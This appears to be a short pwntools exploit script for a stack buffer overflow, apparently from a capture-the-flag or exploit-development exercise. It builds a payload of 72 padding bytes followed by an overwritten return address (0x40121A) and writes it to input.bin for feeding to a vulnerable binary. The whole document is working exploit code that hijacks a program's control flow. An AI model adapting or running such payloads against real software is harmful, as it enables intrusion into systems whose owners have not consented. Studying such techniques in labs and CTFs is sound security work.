from pwn import *

offset = 72
payload = b'A' * offset + p64(0x40121A)

with open("input.bin", "wb") as f:
    f.write(payload)
